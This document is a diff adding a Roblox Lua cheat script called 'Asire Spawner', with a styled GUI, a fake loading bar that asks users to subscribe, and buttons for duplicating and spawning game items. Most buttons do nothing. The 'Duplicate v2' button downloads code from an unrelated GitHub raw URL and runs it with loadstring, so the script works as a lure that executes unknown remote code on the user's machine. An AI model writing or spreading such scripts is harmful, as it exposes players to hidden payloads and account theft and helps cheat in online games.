@@ -1,0 +1,285 @@
+--[[
+    ╔══════════════════════════════════════════════════════╗
+    ║         ASIRE SPAWNER - Color Black × Gray Gradient  ║
+    ║         Logo: rbxassetid://96255128725816            ║
+    ╚══════════════════════════════════════════════════════╝
+]]
+
+-- Khngscript Hub (PlayerGui): 8s loading, Add Brainrot, Duplicate v2 (progress 10s), Lucky Block panel
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local TweenService = game:GetService("TweenService")
+
+local LP = Players.LocalPlayer
+local LPG = LP:WaitForChild("PlayerGui")
+
+local GUI_NAME = "0_AllInOne_PG"
+local old = LPG:FindFirstChild(GUI_NAME)
+if old then old:Destroy() end
+
+-- ============================================================
+-- THEME: Black × Gray Gradient
+-- Background Logo: rbxassetid://96255128725816
+-- ============================================================
+local THEME = {
+    Background1    = Color3.fromRGB(18, 18, 18),   -- Deep Black
+    Background2    = Color3.fromRGB(55, 55, 55),   -- Dark Gray
+    GradientColor1 = ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 10)),
+    GradientColor2 = ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 80, 80)),
+    Accent         = Color3.fromRGB(114, 106, 240),
+    Text           = Color3.fromRGB(255, 255, 255),
+    SubText        = Color3.fromRGB(180, 180, 180),
+    Stroke         = Color3.fromRGB(85, 85, 95),
+    LogoAsset      = "rbxassetid://96255128725816",
+}
+
+-- helpers
+local function pill(parent, text)
+    local b = Instance.new("TextButton", parent)
+    b.Size = UDim2.new(0.48, 0, 0, 46)
+    b.BackgroundColor3 = THEME.Accent
+    b.TextColor3 = THEME.Text
+    b.Font = Enum.Font.GothamSemibold
+    b.TextSize = 14
+    b.AutoButtonColor = true
+    b.Selectable = false
+    b.Text = text
+    local c = Instance.new("UICorner", b)
+    c.CornerRadius = UDim.new(0, 12)
+    local s = Instance.new("UIStroke", b)
+    s.Thickness = 1.2
+    s.Color = THEME.Stroke
+    s.Transparency = 0.75
+    return b
+end
+
+local function setColor(btn, r, g, b)
+    btn.BackgroundColor3 = Color3.fromRGB(r, g, b)
+end
+
+local function dragify(handle, target)
+    local dragging = false
+    local startPos
+    handle.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+            or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            startPos = input.Position
+        end
+    end)
+    handle.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+            or input.UserInputType == Enum.UserInputType.Touch) then
+            local d = input.Position - startPos
+            target.Position = UDim2.new(
+                target.Position.X.Scale,
+                target.Position.X.Offset + d.X,
+                target.Position.Y.Scale,
+                target.Position.Y.Offset + d.Y
+            )
+            startPos = input.Position
+        end
+    end)
+    handle.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+            or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end)
+end
+
+-- ============================================================
+-- GUI ROOT
+-- ============================================================
+local gui = Instance.new("ScreenGui", LPG)
+gui.Name = GUI_NAME
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+gui.ResetOnSpawn = false
+
+-- Main box
+local box = Instance.new("Frame", gui)
+box.Size = UDim2.new(0, 320, 0, 420)
+box.AnchorPoint = Vector2.new(0.5, 0.5)
+box.Position = UDim2.new(0.5, 0, 0.5, 0)
+box.BackgroundColor3 = THEME.Background1
+box.BorderSizePixel = 0
+
+local gradient = Instance.new("UIGradient", box)
+gradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 10)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 70, 70)),
+})
+gradient.Rotation = 135
+
+local boxCorner = Instance.new("UICorner", box)
+boxCorner.CornerRadius = UDim.new(0, 14)
+
+local boxStroke = Instance.new("UIStroke", box)
+boxStroke.Color = THEME.Stroke
+boxStroke.Thickness = 1.5
+boxStroke.Transparency = 0.5
+
+-- Background logo image
+local bgLogo = Instance.new("ImageLabel", box)
+bgLogo.Size = UDim2.new(1, 0, 1, 0)
+bgLogo.Position = UDim2.new(0, 0, 0, 0)
+bgLogo.BackgroundTransparency = 1
+bgLogo.Image = THEME.LogoAsset
+bgLogo.ImageTransparency = 0.82
+bgLogo.ScaleType = Enum.ScaleType.Fit
+bgLogo.ZIndex = 1
+
+-- Avatar
+local avatar = Instance.new("ImageLabel", box)
+avatar.Size = UDim2.new(0, 56, 0, 56)
+avatar.Position = UDim2.new(0, 10, 0, 10)
+avatar.BackgroundTransparency = 1
+avatar.Image = "rbxassetid://115555110268657"
+avatar.ZIndex = 2
+local avatarCorner = Instance.new("UICorner", avatar)
+avatarCorner.CornerRadius = UDim.new(1, 0)
+
+-- Title
+local title = Instance.new("TextLabel", box)
+title.Size = UDim2.new(1, -80, 0, 28)
+title.Position = UDim2.new(0, 74, 0, 10)
+title.BackgroundTransparency = 1
+title.TextColor3 = THEME.Text
+title.Font = Enum.Font.GothamBold
+title.TextSize = 16
+title.Text = "Asire Spawner"
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.ZIndex = 2
+
+local subtitle = Instance.new("TextLabel", box)
+subtitle.Size = UDim2.new(1, -80, 0, 18)
+subtitle.Position = UDim2.new(0, 74, 0, 36)
+subtitle.BackgroundTransparency = 1
+subtitle.TextColor3 = THEME.SubText
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextSize = 12
+subtitle.Text = "TikTok/Youtube: Asire"
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.ZIndex = 2
+
+-- Progress bar
+local barBG = Instance.new("Frame", box)
+barBG.Size = UDim2.new(1, -20, 0, 6)
+barBG.Position = UDim2.new(0, 10, 0, 72)
+barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBG.BorderSizePixel = 0
+barBG.ZIndex = 2
+local barBGCorner = Instance.new("UICorner", barBG)
+barBGCorner.CornerRadius = UDim.new(1, 0)
+
+local fill = Instance.new("Frame", barBG)
+fill.Size = UDim2.new(0, 0, 1, 0)
+fill.BackgroundColor3 = THEME.Accent
+fill.BorderSizePixel = 0
+fill.ZIndex = 3
+local fillCorner = Instance.new("UICorner", fill)
+fillCorner.CornerRadius = UDim.new(1, 0)
+
+-- Sub label
+local subr = Instance.new("TextLabel", box)
+subr.Size = UDim2.new(1, -20, 0, 18)
+subr.Position = UDim2.new(0, 10, 0, 82)
+subr.BackgroundTransparency = 1
+subr.TextColor3 = THEME.SubText
+subr.Font = Enum.Font.Gotham
+subr.TextSize = 11
+subr.Text = "Subscribe to load features..."
+subr.TextXAlignment = Enum.TextXAlignment.Left
+subr.ZIndex = 2
+
+-- Separator
+local sep = Instance.new("Frame", box)
+sep.Size = UDim2.new(1, -20, 0, 1)
+sep.Position = UDim2.new(0, 10, 0, 105)
+sep.BackgroundColor3 = THEME.Stroke
+sep.BorderSizePixel = 0
+sep.ZIndex = 2
+
+-- Body grid
+local body = Instance.new("Frame", box)
+body.Size = UDim2.new(1, -20, 0, 270)
+body.Position = UDim2.new(0, 10, 0, 115)
+body.BackgroundTransparency = 1
+body.ZIndex = 2
+
+local layout = Instance.new("UIGridLayout", body)
+layout.CellPadding = UDim2.new(0, 8, 0, 8)
+layout.CellSize = UDim2.new(0.47, 0, 0, 46)
+layout.FillDirection = Enum.FillDirection.Horizontal
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+layout.VerticalAlignment = Enum.VerticalAlignment.Top
+
+-- Buttons
+local btnAdd = pill(body, "➕ Add Brainrot")
+local btnDup = pill(body, "📋 Duplicate v2")
+local btnLucky = pill(body, "🍀 Lucky Block")
+local btnSpawn = pill(body, "⚡ Spawn")
+local btnClear = pill(body, "🗑 Clear")
+local btnClose = pill(body, "✖ Close")
+
+-- ============================================================
+-- LOADING ANIMATION (8s)
+-- ============================================================
+local percent = Instance.new("TextLabel", box)
+percent.Size = UDim2.new(1, -20, 0, 18)
+percent.Position = UDim2.new(0, 10, 0, 88)
+percent.BackgroundTransparency = 1
+percent.TextColor3 = THEME.Accent
+percent.Font = Enum.Font.GothamBold
+percent.TextSize = 11
+percent.Text = "0%"
+percent.TextXAlignment = Enum.TextXAlignment.Right
+percent.ZIndex = 4
+
+task.spawn(function()
+    for i = 1, 100 do
+        fill.Size = UDim2.new(i / 100, 0, 1, 0)
+        percent.Text = tostring(i) .. "%"
+        task.wait(0.08)
+    end
+    subr.Text = "✔ Access granted"
+    percent.Text = "100%"
+end)
+
+-- ============================================================
+-- BUTTON LOGIC
+-- ============================================================
+btnAdd.MouseButton1Click:Connect(function()
+    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.P, false, game)
+end)
+
+btnDup.MouseButton1Click:Connect(function()
+    btnDup.Text = "Loading..."
+    task.defer(function()
+        local ok, result = pcall(function()
+            return loadstring(game:HttpGet(
+                "https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"
+            ))()
+        end)
+        if ok then
+            btnDup.Text = "📋 Duplicate v2"
+        else
+            btnDup.Text = "❌ Failed"
+        end
+    end)
+end)
+
+btnClose.MouseButton1Click:Connect(function()
+    local existed = LPG:FindFirstChild(GUI_NAME)
+    if existed then existed:Destroy() end
+end)
+
+-- drag
+dragify(title, box)
+
+-- ============================================================
+-- END OF ASIRE SPAWNER
+-- ============================================================
